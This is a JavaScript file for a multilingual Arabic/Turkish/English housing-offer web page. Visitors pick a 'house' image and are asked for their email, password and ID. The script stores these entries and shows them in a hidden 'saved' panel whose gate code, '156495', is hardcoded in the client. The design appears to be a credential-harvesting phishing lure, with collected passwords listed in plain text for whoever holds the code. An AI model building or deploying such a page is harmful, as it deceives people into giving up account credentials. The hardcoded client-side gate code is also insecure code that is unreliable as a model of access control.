/* =========================
   إعدادات المشروع
========================= */

const PASSWORD = "156495";


let selectedHouse = null;

let selectedGovernorate = "";


let savedData = JSON.parse(
    localStorage.getItem("savedData") || "[]"
);


let favorites = JSON.parse(
    localStorage.getItem("favorites") || "[]"
);


let currentLanguage =
    localStorage.getItem("language") || "ar";



/* =========================
   السكنات
========================= */

const houses = [];


for (let i = 1; i <= 12; i++) {

    houses.push({

        id: i,

        image:
            `images/image${i}.jpg`

    });

}



/* =========================
   الترجمات
========================= */

const translations = {

    ar: {

        menu: "📋 القائمة",

        home: "الرئيسية",

        governorates: "المحافظات",

        favorites: "المفضلة",

        saved: "المحفوظات",

        language: "اللغة",

        chooseLanguage:
            "🌐 اختر اللغة",

        mainTitle:
            "🏠 اختر السكن",

        mainDescription:
            "اضغط على الصورة للحصول على السكن",

        search:
            "🔎 ابحث عن السكن...",

        formInfo:
            "أدخل المعلومات المطلوبة",

        back:
            "رجوع",

        sendHouse:
            "إرسال السكن",

        email:
            "📧 البريد الإلكتروني",

        loginCode:
            "🔑 كلمة السر",

        userId:
            "🆔 الـ ID",

        requests:
            "الطلبات",

        savedSearch:
            "🔎 البحث...",

        deleteAll:
            "حذف الكل",

        noHouses:
            "لا يوجد سكن مطابق 🔎",

        noSaved:
            "لا توجد بيانات محفوظة",

        house:
            "السكن",

        clickHouse:
            "اضغط للحصول على السكن",

        governorate:
            "📍 المحافظة",

        delete:
            "🗑️ حذف",

        fillFields:
            "⚠️ املأ الخانات الثلاث",

        savedSuccess:
            "✅ تم إرسال السكن بنجاح",

        addedFavorite:
            "❤️ تمت إضافة السكن للمفضلة",

        removedFavorite:
            "🤍 تمت إزالة السكن من المفضلة",

        deleted:
            "🗑️ تم حذف البيانات",

        deletedAll:
            "🗑️ تم حذف جميع البيانات",

        nothingDelete:
            "لا توجد بيانات للحذف",

        wrongPassword:
            "❌ الرمز غير صحيح"

    },


    tr: {

        menu:
            "📋 Menü",

        home:
            "Ana Sayfa",

        governorates:
            "İller",

        favorites:
            "Favoriler",

        saved:
            "Kayıtlar",

        language:
            "Dil",

        chooseLanguage:
            "🌐 Dil seçin",

        mainTitle:
            "🏠 Konut seç",

        mainDescription:
            "Konut almak için resme tıklayın",

        search:
            "🔎 Konut ara...",

        formInfo:
            "Gerekli bilgileri girin",

        back:
            "Geri",

        sendHouse:
            "Konutu gönder",

        email:
            "📧 E-posta",

        loginCode:
            "🔑 Şifre",

        userId:
            "🆔 ID",

        requests:
            "Başvurular",

        savedSearch:
            "🔎 Ara...",

        deleteAll:
            "Tümünü sil",

        noHouses:
            "Uygun konut bulunamadı 🔎",

        noSaved:
            "Kayıtlı veri yok",

        house:
            "Konut",

        clickHouse:
            "Konut almak için tıklayın",

        governorate:
            "📍 İl",

        delete:
            "🗑️ Sil",

        fillFields:
            "⚠️ Üç alanı doldurun",

        savedSuccess:
            "✅ Konut başarıyla gönderildi",

        addedFavorite:
            "❤️ Favorilere eklendi",

        removedFavorite:
            "🤍 Favorilerden kaldırıldı",

        deleted:
            "🗑️ Veriler silindi",

        deletedAll:
            "🗑️ Tüm veriler silindi",

        nothingDelete:
            "Silinecek veri yok",

        wrongPassword:
            "❌ Kod yanlış"

    },


    en: {

        menu:
            "📋 Menu",

        home:
            "Home",

        governorates:
            "Governorates",

        favorites:
            "Favorites",

        saved:
            "Saved",

        language:
            "Language",

        chooseLanguage:
            "🌐 Choose language",

        mainTitle:
            "🏠 Choose a house",

        mainDescription:
            "Click the image to get the house",

        search:
            "🔎 Search houses...",

        formInfo:
            "Enter the required information",

        back:
            "Back",

        sendHouse:
            "Send house",

        email:
            "📧 Email",

        loginCode:
            "🔑 Password",

        userId:
            "🆔 ID",

        requests:
            "Requests",

        savedSearch:
            "🔎 Search...",

        deleteAll:
            "Delete all",

        noHouses:
            "No matching house 🔎",

        noSaved:
            "No saved data",

        house:
            "House",

        clickHouse:
            "Click to get the house",

        governorate:
            "📍 Governorate",

        delete:
            "🗑️ Delete",

        fillFields:
            "⚠️ Fill in all three fields",

        savedSuccess:
            "✅ House sent successfully",

        addedFavorite:
            "❤️ House added to favorites",

        removedFavorite:
            "🤍 House removed from favorites",

        deleted:
            "🗑️ Data deleted",

        deletedAll:
            "🗑️ All data deleted",

        nothingDelete:
            "No data to delete",

        wrongPassword:
            "❌ Wrong code"

    }

};



/* =========================
   تشغيل المشروع
========================= */

document.addEventListener(
    "DOMContentLoaded",
    function () {

        applyLanguage();

        renderHouses();

    }
);



/* =========================
   اللغة
========================= */

function changeLanguage(language) {

    currentLanguage =
        language;


    localStorage.setItem(
        "language",
        language
    );


    applyLanguage();

    closeLanguages();

    renderHouses();

}



function applyLanguage() {

    const t =
        translations[
            currentLanguage
        ];


    if (currentLanguage === "ar") {

        document.documentElement.lang =
            "ar";

        document.documentElement.dir =
            "rtl";

    } else {

        document.documentElement.lang =
            currentLanguage;

        document.documentElement.dir =
            "ltr";

    }


    document
        .querySelectorAll("[data-i18n]")
        .forEach(element => {

            const key =
                element.getAttribute(
                    "data-i18n"
                );


            if (t[key]) {

                element.textContent =
                    t[key];

            }

        });


    document.getElementById(
        "mainTitle"
    ).textContent =
        t.mainTitle;


    document.getElementById(
        "mainDescription"
    ).textContent =
        t.mainDescription;


    document.getElementById(
        "searchInput"
    ).placeholder =
        t.search;


    document.getElementById(
        "savedSearch"
    ).placeholder =
        t.savedSearch;


    document.getElementById(
        "email"
    ).placeholder =
        t.email;


    document.getElementById(
        "loginCode"
    ).placeholder =
        t.loginCode;


    document.getElementById(
        "userId"
    ).placeholder =
        t.userId;


    if (selectedHouse !== null) {

        document.getElementById(
            "houseTitle"
        ).textContent =

            "🏠 " +
            t.house +
            " " +
            selectedHouse;

    }

}



/* =========================
   عرض السكنات
========================= */

function renderHouses(
    list = houses
) {

    const gallery =
        document.getElementById(
            "gallery"
        );


    const t =
        translations[
            currentLanguage
        ];


    gallery.innerHTML = "";


    if (list.length === 0) {

        gallery.innerHTML = `

            <p style="
                grid-column:1/-1;
                text-align:center;
                opacity:.7;
            ">

                ${t.noHouses}

            </p>

        `;

        return;

    }


    list.forEach(house => {

        const card =
            document.createElement(
                "div"
            );


        card.className =
            "house-card";


        card.onclick =
            function () {

                openForm(
                    house.id
                );

            };


        const isFavorite =
            favorites.includes(
                house.id
            );


        card.innerHTML = `

            <button
                class="favorite-btn">

                ${
                    isFavorite
                    ? "❤️"
                    : "🤍"
                }

            </button>


            <img
                src="${house.image}"
                alt="${t.house} ${house.id}">


            <h3>

                ${t.house}
                ${house.id}

            </h3>


            <p>

                ${t.clickHouse}

            </p>

        `;


        const favoriteButton =
            card.querySelector(
                ".favorite-btn"
            );


        favoriteButton.onclick =
            function (event) {

                toggleFavorite(
                    event,
                    house.id
                );

            };


        gallery.appendChild(
            card
        );

    });

}



/* =========================
   القائمة
========================= */

function toggleMenu() {

    document
        .getElementById(
            "sideMenu"
        )
        .classList.toggle(
            "open"
        );


    document
        .getElementById(
            "menuOverlay"
        )
        .classList.toggle(
            "show"
        );

}



function closeMenu() {

    document
        .getElementById(
            "sideMenu"
        )
        .classList.remove(
            "open"
        );


    document
        .getElementById(
            "menuOverlay"
        )
        .classList.remove(
            "show"
        );

}



/* =========================
   اللغات
========================= */

function showLanguages() {

    closeMenu();


    document
        .getElementById(
            "languageBox"
        )
        .classList.remove(
            "hidden"
        );

}



function closeLanguages() {

    document
        .getElementById(
            "languageBox"
        )
        .classList.add(
            "hidden"
        );

}



/* =========================
   الرئيسية
========================= */

function goHome() {

    closeMenu();


    document
        .getElementById(
            "galleryPage"
        )
        .classList.remove(
            "hidden"
        );


    document
        .getElementById(
            "formPage"
        )
        .classList.add(
            "hidden"
        );


    document
        .getElementById(
            "governoratesPage"
        )
        .classList.add(
            "hidden"
        );


    renderHouses();

}



/* =========================
   المحافظات
========================= */

function showGovernorates() {

    closeMenu();


    document
        .getElementById(
            "galleryPage"
        )
        .classList.add(
            "hidden"
        );


    document
        .getElementById(
            "formPage"
        )
        .classList.add(
            "hidden"
        );


    document
        .getElementById(
            "governoratesPage"
        )
        .classList.remove(
            "hidden"
        );

}



function selectGovernorate(
    name
) {

    selectedGovernorate =
        name;


    const t =
        translations[
            currentLanguage
        ];


    document
        .getElementById(
            "selectedGovernorate"
        )
        .textContent =

            t.governorate +
            ": " +
            name;


    goHome();

}



/* =========================
   فتح السكن
========================= */

function openForm(
    houseNumber
) {

    selectedHouse =
        houseNumber;


    document
        .getElementById(
            "galleryPage"
        )
        .classList.add(
            "hidden"
        );


    document
        .getElementById(
            "governoratesPage"
        )
        .classList.add(
            "hidden"
        );


    document
        .getElementById(
            "formPage"
        )
        .classList.remove(
            "hidden"
        );


    const t =
        translations[
            currentLanguage
        ];


    document
        .getElementById(
            "houseTitle"
        )
        .textContent =

            "🏠 " +
            t.house +
            " " +
            houseNumber;

}



/* =========================
   إرسال السكن
========================= */

function saveData() {

    const email =
        document
            .getElementById(
                "email"
            )
            .value
            .trim();


    const loginCode =
        document
            .getElementById(
                "loginCode"
            )
            .value
            .trim();


    const userId =
        document
            .getElementById(
                "userId"
            )
            .value
            .trim();


    const t =
        translations[
            currentLanguage
        ];


    if (
        !email ||
        !loginCode ||
        !userId
    ) {

        showToast(
            t.fillFields
        );

        return;

    }


    const newData = {

        house:
            selectedHouse,

        governorate:
            selectedGovernorate,

        email:
            email,

        loginCode:
            loginCode,

        userId:
            userId,

        date:
            new Date()
                .toLocaleString()

    };


    savedData.push(
        newData
    );


    localStorage.setItem(
        "savedData",
        JSON.stringify(
            savedData
        )
    );


    clearForm();


    goHome();


    showToast(
        t.savedSuccess
    );

}



/* =========================
   تنظيف النموذج
========================= */

function clearForm() {

    document.getElementById(
        "email"
    ).value = "";


    document.getElementById(
        "loginCode"
    ).value = "";


    document.getElementById(
        "userId"
    ).value = "";

}



/* =========================
   المفضلة
========================= */

function toggleFavorite(
    event,
    id
) {

    event.stopPropagation();


    const t =
        translations[
            currentLanguage
        ];


    if (
        favorites.includes(id)
    ) {

        favorites =
            favorites.filter(
                item =>
                    item !== id
            );


        showToast(
            t.removedFavorite
        );

    } else {

        favorites.push(id);


        showToast(
            t.addedFavorite
        );

    }


    localStorage.setItem(
        "favorites",
        JSON.stringify(
            favorites
        )
    );


    renderHouses();

}



function showFavorites() {

    closeMenu();


    document
        .getElementById(
            "galleryPage"
        )
        .classList.remove(
            "hidden"
        );


    document
        .getElementById(
            "formPage"
        )
        .classList.add(
            "hidden"
        );


    document
        .getElementById(
            "governoratesPage"
        )
        .classList.add(
            "hidden"
        );


    const favoriteHouses =
        houses.filter(
            house =>
                favorites.includes(
                    house.id
                )
        );


    renderHouses(
        favoriteHouses
    );

}



/* =========================
   البحث بالسكن
========================= */

function searchHouses() {

    const value =
        document
            .getElementById(
                "searchInput"
            )
            .value
            .toLowerCase()
            .trim();


    const result =
        houses.filter(
            house =>
                String(
                    house.id
                ).includes(
                    value
                )
        );


    renderHouses(
        result
    );

}



/* =========================
   المحفوظات
========================= */

function openSaved() {

    closeMenu();


    const code =
        prompt(
            "🔐 أدخل رمز المحفوظات"
        );


    if (code !== PASSWORD) {

        showToast(
            translations[
                currentLanguage
            ].wrongPassword
        );

        return;

    }


    document
        .getElementById(
            "savedMenu"
        )
        .classList.remove(
            "hidden"
        );


    showSavedData();

}



function closeSaved() {

    document
        .getElementById(
            "savedMenu"
        )
        .classList.add(
            "hidden"
        );

}



/* =========================
   عرض البيانات
========================= */

function showSavedData(
    list = savedData
) {

    const savedList =
        document.getElementById(
            "savedList"
        );


    const count =
        document.getElementById(
            "requestCount"
        );


    const t =
        translations[
            currentLanguage
        ];


    count.textContent =
        savedData.length;


    savedList.innerHTML =
        "";


    if (list.length === 0) {

        savedList.innerHTML = `

            <p style="
                text-align:center;
                opacity:.6;
            ">

                ${t.noSaved}

            </p>

        `;

        return;

    }


    list.forEach(item => {

        const realIndex =
            savedData.indexOf(
                item
            );


        const div =
            document.createElement(
                "div"
            );


        div.className =
            "saved-item";


        div.innerHTML = `

            <h3>

                🏠
                ${t.house}
                ${item.house}

            </h3>


            ${
                item.governorate
                ?
                `
                <p>
                    ${t.governorate}:
                    ${escapeHTML(
                        item.governorate
                    )}
                </p>
                `
                :
                ""
            }


            <p>
                📧
                ${escapeHTML(
                    item.email
                )}
            </p>


            <p>
                🔑
                ${escapeHTML(
                    item.loginCode
                )}
            </p>


            <p>
                🆔
                ${escapeHTML(
                    item.userId
                )}
            </p>


            <p>
                🕒
                ${escapeHTML(
                    item.date
                )}
            </p>


            <button
                class="delete-btn"
                onclick="
                    deleteItem(
                        ${realIndex}
                    )
                ">

                ${t.delete}

            </button>

        `;


        savedList.appendChild(
            div
        );

    });

}



/* =========================
   البحث بالمحفوظات
========================= */

function searchSaved() {

    const value =
        document
            .getElementById(
                "savedSearch"
            )
            .value
            .toLowerCase()
            .trim();


    const result =
        savedData.filter(
            item =>

                String(
                    item.house
                ).includes(
                    value
                )

                ||

                String(
                    item.email
                )
                .toLowerCase()
                .includes(
                    value
                )

                ||

                String(
                    item.loginCode
                )
                .toLowerCase()
                .includes(
                    value
                )

                ||

                String(
                    item.userId
                )
                .toLowerCase()
                .includes(
                    value
                )
        );


    showSavedData(
        result
    );

}



/* =========================
   حذف واحد
========================= */

function deleteItem(
    index
) {

    savedData.splice(
        index,
        1
    );


    localStorage.setItem(
        "savedData",
        JSON.stringify(
            savedData
        )
    );


    showSavedData();


    showToast(
        translations[
            currentLanguage
        ].deleted
    );

}



/* =========================
   حذف الكل
========================= */

function deleteAll() {

    const t =
        translations[
            currentLanguage
        ];


    if (
        savedData.length === 0
    ) {

        showToast(
            t.nothingDelete
        );

        return;

    }


    savedData = [];


    localStorage.setItem(
        "savedData",
        JSON.stringify(
            savedData
        )
    );


    showSavedData();


    showToast(
        t.deletedAll
    );

}



/* =========================
   التنبيهات
========================= */

function showToast(
    message
) {

    const toast =
        document.getElementById(
            "toast"
        );


    toast.textContent =
        message;


    toast.classList.add(
        "show"
    );


    setTimeout(
        function () {

            toast.classList.remove(
                "show"
            );

        },
        2200
    );

}



/* =========================
   حماية عرض النص
========================= */

function escapeHTML(
    value
) {

    return String(value)

        .replace(
            /&/g,
            "&amp;"
        )

        .replace(
            /</g,
            "&lt;"
        )

        .replace(
            />/g,
            "&gt;"
        )

        .replace(
            /"/g,
            "&quot;"
        )

        .replace(
            /'/g,
            "&#039;"
        );

}